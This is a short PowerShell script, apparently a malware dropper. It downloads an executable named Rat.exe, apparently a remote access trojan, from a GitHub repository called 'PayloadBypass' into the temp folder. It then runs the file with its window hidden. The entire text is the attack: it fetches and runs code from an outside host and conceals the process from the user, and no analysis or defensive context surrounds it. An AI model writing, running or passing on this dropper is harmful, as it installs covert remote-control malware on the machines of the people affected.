$path = "$env:TEMP\Rat.exe"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Santygg/PayloadBypass/refs/heads/main/Rat.exe" -OutFile $path
Start-Process -FilePath $path -WindowStyle Hidden
